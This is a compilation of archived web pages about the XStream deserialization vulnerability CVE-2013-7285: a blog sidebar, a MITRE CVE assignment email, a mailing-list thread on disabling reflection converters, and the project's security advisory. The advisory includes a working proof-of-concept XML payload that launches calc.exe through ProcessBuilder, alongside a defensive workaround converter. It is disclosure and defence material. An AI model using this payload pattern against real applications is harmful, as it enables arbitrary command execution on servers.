[August](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010_08_01_archive.html)     (2)   + ►     [July](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010_07_01_archive.html)     (6)   + ►     [June](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010_06_01_archive.html)     (10)   + ►     [May](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010_05_01_archive.html)     (4)   + ►     [January](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010_01_01_archive.html)     (17)  * ►   [2009](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search?updated-min=2009-01-01T00:00:00Z&updated-max=2010-01-01T00:00:00Z&max-results=46)   (46)   + ►     [December](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009_12_01_archive.html)     (7)   + ►     [November](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009_11_01_archive.html)     (11)   + ►     [September](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009_09_01_archive.html)     (16)   + ►     [August](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009_08_01_archive.html)     (6)   + ►     [July](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009_07_01_archive.html)     (1)   + ►     [June](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009_06_01_archive.html)     (2)   + ►     [May](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009_05_01_archive.html)     (1)   + ►     [January](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009_01_01_archive.html)     (2)  * ►   [2008](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search?updated-min=2008-01-01T00:00:00Z&updated-max=2009-01-01T00:00:00Z&max-results=7)   (7)   + ►     [December](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2008_12_01_archive.html)     (2)   + ►     [November](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2008_11_01_archive.html)     (1)   + ►     [September](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2008_09_01_archive.html)     (4) | Popular Posts  * [New design for o2platform blog and links to post categories](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011/07/new-design-for-o2platform-blog-and.html)    UPDATE: See also  New design for this blog I just spent some time at the O2 Blog where I selected a new theme and categorized all 80 p... * [XStream "Remote Code Execution" exploit on code from "Standard way to serialize and deserialize Objects with XStream" article](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html)   At the DefCon 2013 I co-presented (with Abraham and Alvaro ) the  "RESTing On Your Laurels will Get YOu Pwned" , which showed a n... * [Alternatives to IE WebBrowser Control in .NET](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012/04/alternatives-to-ie-webbrowser-control.html)    UPDATE (Jun/13) : see  When the best way to automate Chrome is to use ... Chrome (with examples on Google search, direct AngularJS scope ma... * [Using XMLDecoder to execute server-side Java Code on an Restlet application (i.e. Remote Command Execution)](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html)   At the  DefCon REST Presentation  we did last week (see slides here ), after the  Neo4J CSRF payload to start processes (calc and nc) on the... * [Real-time Vulnerability Creation Feedback inside VisualStudio (with Greens and Reds)](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012/06/real-time-vulnerability-creation.html)   Here is a pretty cool PoC of a Real-time Vulnerability Creation Feedback inside VisualStudio where I show how a number of security vulnerabi... * [Research on Azure WebSite security: Process Execution (cmd.exe, git.exe, node.exe, xyz.exe) and Folder Browsing (outside azure root)](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/07/research-on-azure-website-security.html)   Following the presentation I did a couple weeks ago at the UK Azure user-group event ( http://ukwaug.net/events/security-compliance/ ), here... * [Running KarmaJS’s AngularJS example test/e2e/angular-scenario (on Chrome)](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/06/running-karmas-angularjs-example.html)   To learn and get an idea of how Karma  (the 'Spectacular Test Runner for JavaScript' ) works, and how it can be used to create brows... * [Using a MAC address to find your physical location (via Google Location Services)](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010/10/using-mac-address-to-find-your-physical.html)   If you see Samy's presentation "How I meet your Girlfriend" you will be shown a very good example of what I think is a "p... * [Spring MVC 3.0 MVC Binding rules](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2009/09/spring-mvc-30-mvc-binding-rules.html)    Following the work done on the O2 Cmd - Spring MVC module and the conversations we had at OWASP AppSec Ireland about the security implica... * [Amazing presentation on integrating security into the SDL](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012/10/amazing-presentation-on-integrating.html)   Nick Galbreath  ( @NGalbreath )  has published the great presentation he delivered at OWASP's AppSec USA last week. You can read it o... |
| --- | --- |

Copyright Creative Commons. Picture Window template. Template images by [mammuth](http://web.archive.org/web/20140204133306/http%3A//www.istockphoto.com/googleimages.php?id=8307896&platform=blogger&langregion=en_GB). Powered by [Blogger](http://web.archive.org/web/20140204133306/http%3A//www.blogger.com/).

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon18_wrench_allbkg.png)](//web.archive.org/web/20140204133306/http%3A//www.blogger.com/rearrange?blogID=7061568054540301299&widgetType=Attribution&widgetId=Attribution1&action=editWidget§ionId=footer-3 "Edit")



=== Content from seclists.org_66075916_20250125_092852.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![oss-sec logo](/images/oss-sec-logo.png)](/oss-sec/)
## [oss-sec](/oss-sec/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](68)
[By Date](date.html#69)
[![Next](/images/right-icon-16x16.png)](70)

[![Previous](/images/left-icon-16x16.png)](67)
[By Thread](index.html#69)
[![Next](/images/right-icon-16x16.png)](70)

![](/shared/images/nst-icons.svg#search)

# Re: CVE request: remote code execution via deserialization in XStream

---

*From*: cve-assign () mitre org

*Date*: Thu, 9 Jan 2014 18:46:19 -0500 (EST)

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

```
> ```
> <http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html>
>
> ```

```

Use CVE-2013-7285.

At least initially, the scope of this CVE is "XStream is an
'reflection-based XML-to-Object conversion'" in that file, and all of
the implications of unrestricted conversion, including "allows the
creation of server side objects based on reflection (which means that
you could have all sorts of business-logic sensitive objects being
created)" -- which is mentioned separately in that file.

If this does not make sense, and multiple CVEs are needed, please let
us know.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJSzzPZAAoJEKllVAevmvms3cEH/3MBAH57R/LhQfI5ZMUm9FOD
eZm7p9IGl3PpSMtrwqSNwXS6InpfAmc04P0xX/HM4yFSRX6yHVaTZA9vbNGRs6PV
VdZg/A+WiUwdBdGhsFfXCb82QvCthdxyv6AAK5uNpVqQTqmikVPNk8gYxcHXZz3+
xUmUGLxwlCtImSZ1WiZMSCMYul3jsFsuOiVlqHF2NBoXh+55xmy8hLTOCUijILeG
lAXfMo25S971OJalr5pzGUC2EPUclV5D08+jv3KCNqryNphsepa3+14OKrvvz1yX
Q19c3+suDKWOUDvur9ENeHkf//Va881GNGZkcvppfvIkYCMI3vKFaWGMYRWR+jE=
=Jkgd
-----END PGP SIGNATURE-----

```

---

[![Previous](/images/left-icon-16x16.png)](68)
[By Date](date.html#69)
[![Next](/images/right-icon-16x16.png)](70)

[![Previous](/images/left-icon-16x16.png)](67)
[By Thread](index.html#69)
[![Next](/images/right-icon-16x16.png)](70)

### Current thread:

* [CVE request: remote code execution via deserialization in XStream](67) *David Jorm (Jan 09)*
  + **Re: CVE request: remote code execution via deserialization in XStream** *cve-assign (Jan 09)*
    - [Re: CVE request: remote code execution via deserialization in XStream](70) *David Jorm (Jan 09)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.mail-archive.com_1b65900f_20250125_092858.html ===


[Skip to site navigation (Press enter)](#nav)

# [[xstream-user] Re: Re: Re: Is it possible to unregister the DynamicProxyConverter using the SpringOXM wrapper](/search?l=user@xstream.codehaus.org&q=subject:%22%5C%5Bxstream%5C-user%5C%5D+Re%5C%3A+Re%5C%3A+Re%5C%3A+Is+it+possible+to+unregister+the+DynamicProxyConverter+using+the+SpringOXM+wrapper%22&o=newest)

[Jörg Schaible](/search?l=user@xstream.codehaus.org&q=from:%22J%C3%B6rg+Schaible%22)
[Thu, 18 Jul 2013 04:24:10 -0700](/search?l=user@xstream.codehaus.org&q=date:20130718)

```
Hi Alvaro,

Alvaro wrote:
```
```

> Thanks for the quick response!
>
> So the way to "disable" the Reflection converters is:
>
> 1 - Register a High priority converter for the beans you are expecting in
> your application

Standard priority is already fine.

> 2 - Register a catch-all converter with higher priority than the
> reflection ones that will throw an exception

Higher or same priority. Actually it applies to ReflectionConverter (lowest
prio) and SerializableConverter (low prio).

> Is that correct?

Right.

> If so, I think this can also been done for the SpringOXM wrapper since
> they expose the registerConverters method.
>
> I agree that the chain of events neccessary to run arbitrary code depends
> on many items of the JRE but it is the Reflection Converter the one that
> makes it possible in the end. So it is like XStream is opening that door
> by default and the way to close it is not immediate. Would it be possible
> to not register the reflection converters by default so only users that
> need them do it?

Unfortunately no. It's one of XStream's key features that you actually can
marshal nearly any object graph out of the box. If we drop the
ReflectionConverter as catch all, we'll break immediately ~99% of all
existing projects using XStream.

Cheers,
Jörg

---------------------------------------------------------------------
To unsubscribe from this list, please visit:

    <http://xircles.codehaus.org/manage_email>

```

* [Previous message](msg00606.html)
* [View by thread](index.html#00607)
* [View by date](maillist.html#00607)
* [Next message](msg00608.html)

* [[xstream-user] Is it possible to unregister the DynamicProx...](msg00602.html) Alvaro
* + [[xstream-user] Re: Is it possible to unregister the Dy...](msg00603.html) Jörg Schaible
  + - [Re: [xstream-user] Re: Is it possible to unregiste...](msg00604.html) Alvaro
    - * [[xstream-user] Re: Re: Is it possible to unreg...](msg00605.html) Jörg Schaible
      * + [Re: [xstream-user] Re: Re: Is it possible ...](msg00606.html) Alvaro
        + - [xstream-user] Re: Re: Re: Is it poss... Jörg Schaible

## Reply via email to

[![The Mail Archive](/logo.png)](/)

Search the site

* [The Mail Archive home](/)
* [user - all messages](/user%40xstream.codehaus.org/)
* [user - about the list](/user%40xstream.codehaus.org/info.html)
* [Expand](/search?l=user@xstream.codehaus.org&q=subject:%22%5C%5Bxstream%5C-user%5C%5D+Re%5C%3A+Re%5C%3A+Re%5C%3A+Is+it+possible+to+unregister+the+DynamicProxyConverter+using+the+SpringOXM+wrapper%22&o=newest&f=1 "e")
* [Previous message](msg00606.html "p")
* [Next message](msg00608.html "n")

* [The Mail Archive home](/)
* [Add your mailing list](/faq.html#newlist)
* [FAQ](/faq.html)
* [Support](/faq.html#support)
* [Privacy](/faq.html#privacy)
* ks8j78$fh5$1@ger.gmane.org



=== Content from x-stream.github.io_a876299c_20250125_092859.html ===

[![XStream](logo.gif)](index.html)

# CVE-2013-7285

## Vulnerability

CVE-2013-7285: XStream can be used for Remote Code Execution.

## Affected Versions

All versions until and including version 1.4.6 are affected, but a [workaround](#workaround) exist.

Version 1.4.10 is affected if the security framework has not been initialized.

## Description

The processed stream at unmarshalling time contains type information to recreate the formerly written objects.
XStream creates therefore new instances based on these type information. An attacker can manipulate the processed
input stream and replace or inject objects, that can execute arbitrary shell commands.

## Steps to Reproduce

Create a simple interface e.g. named *Contact* and an implementation class. Use XStream to marshal such
an object to XML. Replace the XML with following snippet and unmarshal it again with XStream:

```
<contact class='dynamic-proxy'>
  <interface>org.company.model.Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>

```

```
XStream xstream = new XStream();
Contact contact = (Contact)xstream.fromXML(xml);

```

Then as soon as the code calls any method on the Contact instance, the payload gets executed, e.g.
contact.getFirstName().

Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.

## Impact

The vulnerability may allow a remote attacker to run arbitrary shell commands only by manipulating the processed
input stream.

## Workaround

Users can register an own converter for dynamic proxies, the *java.beans.EventHandler* type or for the
*java.lang.ProcessBuilder* type, that also protects against an attack for this special case:

```
xstream.registerConverter(new Converter() {
  public boolean canConvert(Class type) {
    return type != null && (type == java.beans.EventHandler || type == java.lang.ProcessBuilder || Proxy.isProxy(type));
  }

  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    throw new ConversionException("Unsupported type due to security reasons.");
  }

  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
    throw new ConversionException("Unsupported type due to security reasons.");
  }
}, XStream.PRIORITY_LOW);

```
## Credits

The vulnerability was discovered and reported by Pierre Francis Ernst of IBM Canada.

# Software

* [About XStream](index.html)
* [News](news.html)
* [Change History](changes.html)
* [Security Aspects](security.html)
* [About Versioning](versioning.html)

# Evaluating XStream

* [Two Minute Tutorial](tutorial.html)
* [License](license.html)
* [Download](download.html)
* [References](references.html)
* [Benchmarks](benchmarks.html)
* [Code Statistics](https://www.openhub.net/p/xstream)

# Using XStream

* [Architecture Overview](architecture.html)
* [Object references](graphs.html)
* [Tweaking the Output](manual-tweaking-output.html)
* [Converters](converters.html)
* [Frequently Asked Questions](faq.html)
* [Mailing Lists](mailing-lists.html)
* [Reporting Issues](issues.html)

# Javadoc

* [XStream Core](javadoc/index.html)
* [Hibernate Extensions](hibernate-javadoc/index.html)
* [JMH Module](jmh-javadoc/index.html)

# Tutorials

* [Two Minute Tutorial](tutorial.html)
* [Alias Tutorial](alias-tutorial.html)
* [Annotations Tutorial](annotations-tutorial.html)
* [Converter Tutorial](converter-tutorial.html)
* [Object Streams Tutorial](objectstream.html)
* [Persistence API Tutorial](persistence-tutorial.html)
* [JSON Tutorial](json-tutorial.html)
* [StudyTrails](http://www.studytrails.com/java/xml/xstream/xstream-introduction.jsp)

# Developing XStream

* [How to Contribute](how-to-contribute.html)
* [Development Team](team.html)
* [Source Repository](repository.html)
* [Continuous Integration](https://travis-ci.org/x-stream/xstream/branches)



=== Content from lists.apache.org_b6145385_20250125_092857.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_dc4e6aeb_20250125_092857.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.


